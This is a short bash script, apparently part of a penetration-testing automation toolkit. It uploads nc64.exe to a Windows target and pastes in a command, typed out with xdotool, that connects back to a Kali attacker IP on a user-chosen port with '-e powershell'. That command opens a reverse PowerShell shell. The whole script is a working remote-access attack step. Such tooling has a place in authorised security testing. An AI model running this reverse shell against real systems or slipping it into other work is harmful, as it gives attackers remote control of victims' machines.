#!/bin/bash

: '
upload nc64.exe and start nc64.exe and execute powershell
'

LOCATION="${SCRIPTS_DIR}/fileTransfer/windows/.binaries"
FILE="nc64.exe"
EXECUTE_COMMAND="powershell"

cmd_upload_file "${LOCATION}" "${FILE}"

# Generate GUI form items (label, type (optional: default text), name, default (optional))
PORT_FIELD=$(form_item  "port" "number" "port" "1337")

# Generate GUI form
generate_form "${PORT_FIELD}"

PORT=${form_data["port"]}

paste_command "${FILE_LOCATION} ${KALI_IP} ${PORT} -e ${EXECUTE_COMMAND}"
xdotool key Return
